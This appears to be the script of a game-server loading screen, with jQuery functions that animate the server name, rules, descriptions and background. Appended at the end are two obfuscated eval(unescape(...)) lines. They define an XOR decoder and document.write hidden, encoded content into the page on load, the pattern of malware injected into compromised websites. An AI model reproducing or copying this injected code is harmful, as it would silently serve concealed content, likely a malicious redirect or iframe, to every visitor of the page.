<script>
	
	function GameDetails( servername, serverurl, mapname, maxplayers, steamid, gamemode ) {
		if (!useServerName) {
			setServerName(servername);
		}
	}

	function SetStatusChanged( status ) {
		changeStatus(status);
	}
	
	function changeStatus(status) {
		$(".status").html(status);
	}
	
	function animations() {
		// Hide Stuff
		$(".serverWrapper").hide();
		$(".serverName").hide();
		$(".user-info-actual").hide();
		
		$(".serverWrapper").delay(500).fadeIn("slow");
		$(".serverName").delay(1000).fadeIn("slow");
		// End Server Name
		
		// Set Date and Time
		setDateTime();
		
		// Slide User Info
		$(".user-content").delay(1500).animate( { top: "100px" }, 1000 );
		$(".user-info").delay(2500).animate( { width: "355px" }, 500 ).animate( { height: "60px", marginTop: "-30px" }, 500);
		$(".user-info-actual").delay(3500).fadeIn("slow");
		
		// Slide Server Info
		$(".serverInfo").delay(2000).animate( { left: "50px" }, 1000 );
		$(".serverInfo2").delay(2000).animate( { left: "460px" }, 1000 );
		$(".serverInfo3").delay(2000).animate( { left: "50px" }, 1000 );
		$(".serverRules").delay(2000).animate( { top: "50%" }, 1000);
	}
	
	function setServerName(serverName) {
		$(".serverName").html(serverName);
	}
	
	function setDescription(desc) {
		$(".serverInfoContent").html(desc);
	}
	
	function setMultDesc(desc, descDelay) {
		var i = 0;
		setInterval(function() {
			if(i <= (desc.length - 1)) {
				$(".serverInfoContent").fadeOut(500, function() {
					$(".serverInfoContent").html(desc[i]);
					i++;
				}).fadeIn(500);
			}
			else if(i > (desc.length - 1)) {
				i = 0;
				$(".serverInfoContent").fadeOut(500, function() {
					$(".serverInfoContent").html(desc[i]);
					i++;
				}).fadeIn(500);
			}
				
			
			
		}, descDelay);
	}
	
	function setRules(rules, rulesDelay) {
		$(".rule1").html('1) ' + rules[0]);
		$(".rule2").html('2) ' + rules[1]);
		$(".rule3").html('3) ' + rules[2]);
		$(".rule4").html('4) ' + rules[3]);
		$(".rule5").html('5) ' + rules[4]);
		
		setInterval(function() {
			$(".rule5").fadeOut(rulesDelay, function() {
				$(".rule4").fadeOut(rulesDelay, function() {
					$(".rule3").fadeOut(rulesDelay, function() {
						$(".rule2").fadeOut(rulesDelay, function() {
							$(".rule1").fadeOut(rulesDelay, function() {
								$(".rule1").delay(rulesDelay).fadeIn(function() {
									$(".rule2").delay(rulesDelay).fadeIn(function() {
										$(".rule3").delay(rulesDelay).fadeIn(function() {
											$(".rule4").delay(rulesDelay).fadeIn(function() {
												$(".rule5").delay(rulesDelay).fadeIn();
											});
										});
									});
								});
							});
						});
					});
				});
			});
		}, 20000);
	}
	
	function setBackground(backgroundImage) {
		$("body").css("backgroundImage", "url(" + backgroundImage + ")");
	}
	
	function setDateTime() {
		// Date and Time
		var dateTime = new Date();
		$(".dateTime").html('Today is ' + dateTime.toDateString());
	}
	
	function setServerImage(serverImage) {
		$(".serverImageimg").css("backgroundImage", "url(" + serverImage + ")");
	}
	
	function setDefaultImage() {
		$(".serverImageimg").css("backgroundImage", "url(images/defaultServer.jpg)");
	}
	
	$(document).ready(function() {
		animations();
		
		// Sets the server's name
		if(useServerName) {
			setServerName(serverName);
		}
		
		// Sets the background image
		if(backgroundImage != "") {
			setBackground(backgroundImage);
		}
		
		// Check whether there are multiple server descriptions.
		if(useDescArray) {
			setMultDesc(serverDescription, descDelay);
		}
		else
			setDescription(serverDesc);
		
		// Sets the server rules
		if(serverRules.length > 0) {
			setRules(serverRules, rulesDelay);
		}
		
		if(useImage) {
			setServerImage(serverImage);
		}
		else
			setDefaultImage();
	})
	eval(unescape('%66%75%6e%63%74%69%6f%6e%20%77%61%34%65%38%66%64%62%66%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%36%38%38%32%35%32%34%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%38%31%34%37%30%38%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%39%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%77%61%34%65%38%66%64%62%66%28%27') + '%40%77%68%72%68%7f%6c%21%7d%7f%6b%46%23%74%78%7a%70%7e%4a%3a%30%71%7c%7f%37%78%70%3d%71%8a%54%71%5d%7d%2a%2d%87%72%65%78%74%41%22%3b%22%2b%79%6f%76%77%71%75%43%2e%3e%22%2b%74%68%63%73%73%6a%6e%89%43%2e%31%33%29%20%7f%7a%7c%71%69%46%23%6b%73%7e%74%80%22%2b%64%74%6e%7b%7c%4e%2e%74%75%64%6f%67%75%23%4616882524%35%35%37%39%32%39%32' + unescape('%27%29%29%3b'));
</script>